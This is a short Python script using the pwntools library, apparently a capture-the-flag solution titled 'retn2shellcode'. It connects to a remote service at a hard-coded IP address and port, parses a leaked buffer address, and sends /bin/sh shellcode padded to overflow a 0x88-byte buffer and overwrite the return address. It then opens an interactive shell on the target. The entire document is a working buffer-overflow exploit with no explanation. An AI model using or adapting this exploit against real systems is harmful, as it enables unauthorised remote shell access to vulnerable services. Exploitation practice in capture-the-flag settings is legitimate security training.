# retn2shellcode
from pwn import *
context(log_level='debug', arch='i386', os='linux' )

p=remote('58.240.236.231',55404 )
# p=process('./overflow4')

shellcode=asm(shellcraft.sh())

buf2_addr = p.recvline().decode().strip('\n')
buf2_addr = buf2_addr.split(' = ')[1]
buf2_addr = int(buf2_addr, 16)
print(buf2_addr)


# payload = flat(shellcode, (0x88 + 4 - len(shellcode)) * 'd', p32(buf2_addr))
payload = flat(shellcode.ljust(0x88+4,b'A'), p32(buf2_addr))
p.sendline(payload)
p.interactive()
